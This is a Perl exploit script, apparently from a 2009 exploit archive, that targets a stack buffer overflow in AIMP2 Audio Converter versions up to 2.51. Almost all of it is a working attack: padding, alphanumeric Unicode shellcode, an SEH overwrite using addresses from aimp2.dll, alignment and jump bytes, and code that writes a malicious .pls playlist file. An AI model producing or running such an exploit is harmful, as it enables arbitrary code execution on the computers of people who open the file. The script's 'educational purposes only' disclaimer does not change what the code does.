-----------------------------------------------------------------------

# [*] Vulnerability     : AIMP2 Audio Converter Playlist (pls) BOF
# [*] Discovered by     : mr_me (http://milw0rm.com/exploits/9561)
# [*] Sploit written by : corelanc0d3r (corelanc0d3r[at]gmail[dot]com)
# [*] Sploit written    : nov 7th, 2009
# [*] Sploit released   : nov 11th, 2009
# [*] Type              : local and remote code execution
# [*] OS                : Windows
# [*] Product           : AIMP2 Audio Converter (aimp2c.exe)
# [*] Versions affected : <= 2.51 build 330
# [*] Download from     : http://download.softpedia.com/dl/fc4ba08d060d34b748131a14137f341e/4af5a079/100070491/software/multimedia/audio/aimp_2.51.330.zip
# [*] -------------------------------------------------------------------------
# [*] Method            : SEH / Unicode
# [*] Tested on         : XP SP3 En (VirtualBox)
# [*] Greetz&Tx to      : DellNull/EdiStrosar
# [*] -------------------------------------------------------------------------
#                                               MMMMM~.                          #                                               MMMMM?.                          #    MMMMMM8.  .=MMMMMMM.. MMMMMMMM, MMMMMMM8.  MMMMM?. MMMMMMM:   MMMMMMMMMM.   #  MMMMMMMMMM=.MMMMMMMMMMM.MMMMMMMM=MMMMMMMMMM=.MMMMM?7MMMMMMMMMM: MMMMMMMMMMM:  #  MMMMMIMMMMM+MMMMM$MMMMM=MMMMMD$I8MMMMMIMMMMM~MMMMM?MMMMMZMMMMMI.MMMMMZMMMMM:  #  MMMMM==7III~MMMMM=MMMMM=MMMMM$. 8MMMMMZ$$$$$~MMMMM?..MMMMMMMMMI.MMMMM+MMMMM:  #  MMMMM=.     MMMMM=MMMMM=MMMMM7. 8MMMMM?    . MMMMM?NMMMM8MMMMMI.MMMMM+MMMMM:  #  MMMMM=MMMMM+MMMMM=MMMMM=MMMMM7. 8MMMMM?MMMMM:MMMMM?MMMMMIMMMMMO.MMMMM+MMMMM:  #  =MMMMMMMMMZ~MMMMMMMMMM8~MMMMM7. .MMMMMMMMMMO:MMMMM?MMMMMMMMMMMMIMMMMM+MMMMM:  #  .:$MMMMMO7:..+OMMMMMO$=.MMMMM7.  ,IMMMMMMO$~ MMMMM?.?MMMOZMMMMZ~MMMMM+MMMMM:  #     .,,,..      .,,,,.   .,,,,,     ..,,,..   .,,,,.. .,,...,,,. .,,,,..,,,,.  #                                                                   eip hunters
# -----------------------------------------------------------------------------
# Script provided 'as is', without any warranty. # Use for educational purposes only.
#
#
my $header = "[playlist]\nNumberOfEntries=1\n\n";
$header=$header."File1=";
my $junk="A" x 2017;
my $shellcode="PPYAIAIAIAIAQATAXAZAPA3QADAZABARA".
"LAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZA".
"BABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB".
"KLK8U9M0M0KPS0U99UNQ8RS44KPR004K22LLDKR2MD4KCBMX".
"LOGG0JO6NQKOP1WPVLOLQQCLM2NLMPGQ8OLMM197K2ZP22B7".
"TK0RLPTK12OLM1Z04KOPBX55Y0D4OZKQXP0P4KOXMHTKR8MP".
"KQJ3ISOL19TKNTTKM18VNQKONQ90FLGQ8OLMKQY7NXK0T5L4".
"M33MKHOKSMND45JBR84K0XMTKQHSBFTKLL0KTK28MLM18S4K".
"KT4KKQXPSYOTNDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM".
"2JKQTMSU89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU".
"7MEMKOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC".
"QQ2LRCM0LJA";
my $morejunk = "A" x (4065-length($junk.$shellcode));

my $seh="\x41\x6d";   my $nseh="\x0e\x45";  #aimp2.dll
my $align = "\x58"; $align=$align."\x6d";
$align=$align."\x58";  $align=$align."\x6d";
$align=$align."\x58";  $align=$align."\x6d";
$align=$align."\x58";  $align=$align."\x6d";

$align = $align."\x05\x02\x22";   $align=$align."\x6d";   $align=$align."\x2d\x09\x11";   $align=$align."\x6d";   $align=$align."\x2d\x09\x11";   $align=$align."\x6d"; 
my $jump = "\x50";  $jump=$jump."\x6d"; $jump=$jump."\xc3";
my $rest = "A" x 1000;

my $payload=$header.$junk.$shellcode.$morejunk.$seh.$nseh.$align.$jump.$rest."\n";

open(myfile,'>aimp2sploit.pls'); print myfile $payload; print "Wrote " . length($payload)." bytes to aimp2sploit.pls\n";   
close(myfile);

